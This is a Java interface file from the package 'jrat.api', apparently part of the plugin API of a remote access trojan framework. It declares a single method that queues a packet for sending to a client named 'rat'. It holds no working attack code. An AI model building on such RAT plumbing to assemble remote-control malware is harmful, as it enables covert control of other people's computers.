package jrat.api;

public abstract interface Queue {

	/**
	 * Add packet to queue, callback into client to add to *real* queue
	 * 
	 * @param packet
	 * @param rat
	 * @throws Exception
	 */
	public abstract void addToSendQueue(PacketBuilder packet, Client rat) throws Exception;

}
